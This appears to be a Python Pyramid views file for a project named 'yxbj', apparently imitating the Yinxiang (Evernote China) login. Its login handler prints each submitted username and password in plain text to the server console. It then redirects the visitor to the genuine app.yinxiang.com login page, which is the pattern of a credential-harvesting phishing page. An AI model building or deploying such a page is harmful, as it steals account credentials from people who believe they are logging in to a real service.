from pyramid.view import view_config
from pyramid.httpexceptions import HTTPFound


@view_config(route_name='home', renderer='templates/mytemplate.pt')
def my_view(request):
    return {'project': 'yxbj'}

@view_config(route_name='login', renderer='templates/login.pt')
def login_view(request):
    if request.POST.get('username') and request.POST.get('password'):
        print('='*80)
        print('-'*80)
        print(request.POST.get('username'))
        print(request.POST.get('password'))
        print('-'*80)
        print('='*80)
        return HTTPFound(location='https://app.yinxiang.com/Login.action?targetUrl=%2FHome.action%3Foffer%3Dwww_menu')
    return {'project': 'yxbj'}
